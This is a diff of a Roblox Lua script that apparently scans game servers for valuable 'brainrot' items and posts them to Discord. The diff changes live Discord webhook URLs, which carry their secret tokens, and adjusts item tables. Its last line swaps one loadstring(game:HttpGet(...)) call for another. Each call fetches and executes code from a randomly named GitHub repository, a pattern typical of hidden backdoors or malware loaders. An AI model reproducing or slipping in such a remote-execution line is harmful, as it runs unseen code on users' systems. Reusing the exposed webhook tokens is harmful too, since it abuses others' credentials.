@@ -1,4 +1,3 @@
-
 local Players = game:GetService('Players')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
@@ -85,7 +84,7 @@ local WEBHOOKS = {
         showJoinerAd = true
     },
     { -- Special brainrots + overpay + mutations
-        url = 'https://discord.com/api/webhooks/1456411952074195051/bdZLaeKaRFCMy3HQOj50RsTq8nn1z18PBkyj_-iKfy1AZ7YK7gvst_Z-yv-lgJfKzOm3',
+        url = 'https://discord.com/api/webhooks/1457015322119897133/kQkqA4AMYLVviEYFT7Rf4Udz6ATSRYPVcPeDtALzHFfveew7jmjGCPE6Q-5KAZViCaIE',
         title = '⭐️ SPECIAL BRAINROTS + MUTATIONS',
         color = 0xff00ff,
         special = true,
@@ -134,7 +133,7 @@ local SPECIAL_BRAINROTS = {
     ['Las Sis'] = { min = 500_000_000, mutations = {"Candy", "Lava"} },
     ['La Extinct Grande'] = { min = 400_000_000, mutations = {} },
     ['Los Bros'] = { min = 500_000_000, mutations = {"Candy", "Lava", "Rainbow"} },
-    ['Spaghetti Tualetti'] = { min = 700_000_000, mutations = {"Bloodrot", "Rainbow"} },
+    ['Spaghetti Tualetti'] = { min = 500_000_000, mutations = {"Bloodrot", "Rainbow"} },
     ['Esok Sekolah'] = { min = 600_000_000, mutations = {} },
     ['Nuclearo Dinossauro'] = { min = 300_000_000, mutations = {"Cursed", "Bloodrot"} },
     ['Lavadorito Spinito'] = { min = 500_000_000, mutations = {"Cursed", "Bloodrot", "Candy", "Lava", "Yin Yang", "Radioactive", "Rainbow", "Galaxy"} },
@@ -149,7 +148,6 @@ local SPECIAL_BRAINROTS = {
     ['Cerberus'] = { min = 0, mutations = {} },
     ['Ay Mi Gatito'] = { min = 0, mutations = {} },
     ['BRUNITO MARSITO'] = { min = 0, mutations = {} },
-    ['AY MI GATITO MIAU MIAU'] = { min = 0, mutations = {} },
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -296,7 +294,6 @@ local OBJECTS = {
     ['Cerberus'] = { emoji = '👹', important = true },
     ['Ay Mi Gatito'] = { emoji = '😻', important = true },
     ['BRUNITO MARSITO'] = { emoji = '🥸', important = true },
-    ['AY MI GATITO MIAU MIAU'] = { emoji = '😻', important = true },
 }
 
 local ALWAYS_IMPORTANT = {}
@@ -901,4 +898,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ivasdfwfe/wdfesdfaa/refs/heads/main/sdfsdfsdfsdfe1"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/g5hg45yhhop.lua"))()
